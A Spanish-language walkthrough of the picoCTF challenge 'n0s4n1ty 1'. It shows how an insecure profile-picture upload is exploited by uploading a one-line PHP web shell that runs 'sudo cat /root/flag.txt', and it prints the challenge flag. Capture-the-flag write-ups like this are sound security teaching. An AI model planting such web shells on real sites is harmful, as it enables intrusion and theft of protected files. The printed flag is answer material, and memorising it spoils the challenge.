## Reto: n0s4n1ty 1
### Descripción
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.You can access the web application [here](http://standard-pizzas.picoctf.net:50122/)!

### Solución
1. Ingresamos al sitio web
![Captura1](Capturas/Captura1.png)

2. Debemos subir un archivo `php`, así que creamos uno llamada shell y dentro de él hacemos un código con el podamos acceder a la bandera `x.php`
```php
<?php echo exec("sudo cat /root/flag.txt");?>
```

3. Subimos el archivo y accedemos a él modificando el link del sitio
```http
http://standard-pizzas.picoctf.net:50122/uploads/x.php
```

Y obtenemos la bandera:
```flag
picoCTF{wh47_c4n_u_d0_wPHP_d698d800}
```
### Notas adicionales
### Referencias

